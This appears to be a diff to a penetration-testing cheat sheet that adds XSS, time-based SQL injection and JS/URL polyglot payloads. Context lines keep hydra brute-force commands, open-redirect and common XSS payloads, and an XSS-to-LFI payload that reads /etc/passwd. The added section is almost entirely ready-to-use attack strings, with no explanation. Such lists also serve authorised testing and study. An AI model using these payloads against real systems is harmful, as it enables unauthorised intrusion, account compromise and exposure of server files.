@@ -23,15 +23,20 @@
      - [brute force >](#brute-force)
      		- [hydra](#hydra)
       		- [ffuf](#ffuf)
-   - [Bypass technics](#bypass-technics)
+  - [Polyglot payloads](#polyglot-payloads)
+     - [XSS polyglot](#xss-polyglot)
+     - [SQLi polyglot](#sqli-polyglot)
+     - [JS/URL polyglot](#jsurl-polyglot)  
+  - [Bypass technics](#bypass-technics)
      - [Bypass file upload filtering](#bypass-file-upload-filtering)
      - [Bypass 401/403](#bypass-401403)
      - [Bypass password reset](#bypass-password-reset)
   - [Open redirect](#open-web-redirect)
   - [PHP filter](#php-filters-for-lfi)
-  - [Cross Side Scripting (XSS)](#xss-common-payloads)
+  - [Cross Side Scripting (XSS)](#xss)
+      - [Common payloads](#common-payloads)
       - [XSS to LFI](#xss-to-lfi)
-      - [Top XXE dorks](#top-xxe-dorks)
+      - [Top XSS dorks](#top-xss-dorks)
   - [XML External Entity (XXE)](#xxe-common-payloads)
       - [Exploitable Protocols](#exploitable-protocols)
   - [Server Side Template Injection (SSTI)](#server-side-template-injection-ssti)
@@ -154,7 +159,37 @@ The following table uses the $ip variable which can be set with the following co
 | `hydra -L users.txt -P passwords.txt $ip ldap2 -V -f` | LDAP Brute Forcing |
 
 -----------------------------------------------------------------------------------------------------------------
-# Bypass
+# Polyglot payloads
+
+### XSS polyglot
+
+```
+%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
+```
+```
+'">*/--></title></style></textarea></script%0A><img src=x onerror=confirm(1)>
+```
+```
+" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)// 
+```
+```
+">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
+```
+
+### SQLi polyglot
+```
+SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/
+```
+```
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR"*/
+```
+
+### JS/URL polyglot
+```
+data:text/html;alert(1)/*,<svg%20onload=eval(unescape(location))><title>*/;alert(2);function%20text(){};function%20html(){}
+```
+-----------------------------------------------------------------------------------------------------------------
+# Bypass technics
 ### Bypass File Upload Filtering
 
 `GIF89a`
@@ -244,7 +279,8 @@ https://www.whitelisteddomain.tld@google.com/%2f..
 #### [source](https://github.com/payloadbox/open-redirect-payload-list)
 -------------------------------------------------------------------------------------------------------------
 
-# XSS common payloads
+# XSS
+### Common payloads
 ```xml
 <img src=x>
 <script>alert('XSS')</script>
@@ -277,6 +313,7 @@ https://www.whitelisteddomain.tld@google.com/%2f..
 <x oncut=alert()>x
 <svg onload=write()>
 ```
+
 ### XSS to LFI
 
 #### most common payloads
@@ -299,8 +336,8 @@ https://www.whitelisteddomain.tld@google.com/%2f..
 ```js
 <script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>
 ```
-### Top XXE dorks
-```
+### Top XSS dorks
+```http
 ?q={payload}
 ?s={payload}
 ?search={payload}
@@ -1789,11 +1826,10 @@ sudo systemctl start snapd.service
 ```
 sudo apt install evolution
 ```
-
 ### SQLi XSS SSTI
 `one line payload`
 ```
-<svg/onload="alert('xss');">{{7*7}}</svg>
+<svg onload="prompt(5);">{{7*7}}</svg>
 ```
 
 ### ShellShock
